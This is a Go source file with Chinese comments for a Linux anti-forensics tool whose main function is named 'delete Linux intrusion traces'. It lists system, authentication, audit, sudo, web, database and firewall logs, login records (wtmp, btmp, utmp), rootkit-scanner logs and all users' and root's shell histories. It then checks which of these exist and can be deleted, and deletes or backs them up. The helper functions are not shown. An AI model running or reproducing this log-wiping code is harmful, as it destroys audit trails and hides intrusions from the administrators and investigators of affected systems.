package module

import (
	"fmt"
	"path/filepath"
	"strings"
)

// DeleteLinuxIntrusionTraces 删除Linux系统的入侵痕迹
func DeleteLinuxIntrusionTraces() {
	folders := GetLinuxPaths()

	// 第一阶段：检查文件夹是否存在
	existingFolders := checkPathsExist(folders)
	if len(existingFolders) == 0 {
		fmt.Println("没有找到任何需要处理的文件夹。")
		return
	}

	// 第二阶段：检查文件夹内是否有文件
	nonEmptyFolders := checkPathContents(existingFolders)
	if len(nonEmptyFolders) == 0 {
		fmt.Println("所有检测到的文件夹都是空的。")
		return
	}

	// 第三阶段：检查文件夹权限
	deletableFolders := checkFoldersPermissions(nonEmptyFolders)

	// 第四阶段：检查文件夹大小，并分类
	smallFolders, largeFolders := classifyPathsBySize(deletableFolders)

	// 第五阶段：执行相应的删除或备份操作
	deleteAllFolders(smallFolders, largeFolders)
}

// DeleteLinuxLargeKeepSmall 删除大文件夹，保留小文件夹
func DeleteLinuxLargeKeepSmall() {
	folders := GetLinuxPaths()

	// 第一阶段：检查文件夹是否存在
	existingFolders := checkPathsExist(folders)
	if len(existingFolders) == 0 {
		fmt.Println("没有找到任何需要处理的文件夹。")
		return
	}

	// 第二阶段：检查文件夹内是否有文件
	nonEmptyFolders := checkPathContents(existingFolders)
	if len(nonEmptyFolders) == 0 {
		fmt.Println("所有检测到的文件夹都是空的。")
		return
	}

	// 第三阶段：检查文件夹权限
	deletableFolders := checkFoldersPermissions(nonEmptyFolders)

	// 第四阶段：检查文件夹大小，并分类
	smallFolders, largeFolders := classifyPathsBySize(deletableFolders)
	deleteLargeKeepSmall(smallFolders, largeFolders)
}

// RestoreLinuxSmallFolders 恢复小文件夹
func RestoreLinuxSmallFolders() {
	restoreSmallFolders()
}

// GetLinuxPaths 获取系统中重要的文件和文件夹路径，支持通配符
func GetLinuxPaths() []string {
	basePaths := []string{
		// 系统日志文件
		"/var/log/syslog",
		"/var/log/messages",
		"/var/log/auth.log",
		"/var/log/lastlog",
		"/var/log/wtmp",
		"/var/log/btmp",
		"/var/log/faillog",

		// Apache日志文件
		"/var/log/apache2/access.log",
		"/var/log/apache2/error.log",

		// Nginx日志文件
		"/var/log/nginx/access.log",
		"/var/log/nginx/error.log",

		// MySQL日志文件
		"/var/log/mysql/error.log",
		"/var/log/mysql/mysql.log",

		// 系统服务日志文件
		"/var/log/daemon.log",
		"/var/log/kern.log",
		"/var/log/mail.log",
		"/var/log/mail.err",
		"/var/log/secure",
		"/var/log/audit/audit.log",
		"/var/log/sudo.log",

		// 临时文件和目录
		"/tmp/",
		"/var/tmp/",

		// 用户历史记录
		"/home/*/.bash_history",
		"/home/*/.zsh_history",
		"/root/.bash_history",
		"/root/.zsh_history",

		// SSH相关日志
		"/var/log/secure",
		"/var/log/auth.log",
		"/var/log/sshd.log",
		"/var/log/sshd/*",

		// Utmp和Wtmp日志
		"/var/run/utmp",
		"/var/log/wtmp",
		"/var/log/btmp",

		// Dmesg日志
		"/var/log/dmesg",

		// Package Manager日志
		"/var/log/yum.log",
		"/var/log/apt/history.log",
		"/var/log/apt/term.log",

		// Systemd日志
		"/var/log/journal/",

		// 安全工具日志
		"/var/log/rkhunter/rkhunter.log",
		"/var/log/chkrootkit/chkrootkit.log",

		// 应用程序日志
		"/var/log/docker.log",
		"/var/log/kubernetes/",
		"/var/log/containers/",

		// 各种服务的日志
		"/var/log/postgresql/",
		"/var/log/mongodb/mongod.log",
		"/var/log/redis/redis.log",

		// Web应用日志
		"/var/log/tomcat/",
		"/var/log/glassfish/",

		// 邮件日志
		"/var/log/maillog",
		"/var/log/mail.err",

		// 防火墙日志
		"/var/log/firewalld",
		"/var/log/iptables.log",

		// 网络日志
		"/var/log/samba/*",
		"/var/log/rsyncd.log",

		// 其他可能的入侵痕迹
		"/var/log/wtmp.1",
		"/var/log/btmp.1",
	}

	var expandedPaths []string
	for _, path := range basePaths {
		if strings.Contains(path, "*") { // 检查路径是否包含通配符
			matches, err := filepath.Glob(path)
			if err != nil {
				fmt.Printf("解析路径失败: %s, 错误: %v\n", path, err)
				continue
			}
			expandedPaths = append(expandedPaths, matches...) // 添加匹配的路径
		} else {
			expandedPaths = append(expandedPaths, path) // 添加原始路径
		}
	}

	return expandedPaths
}
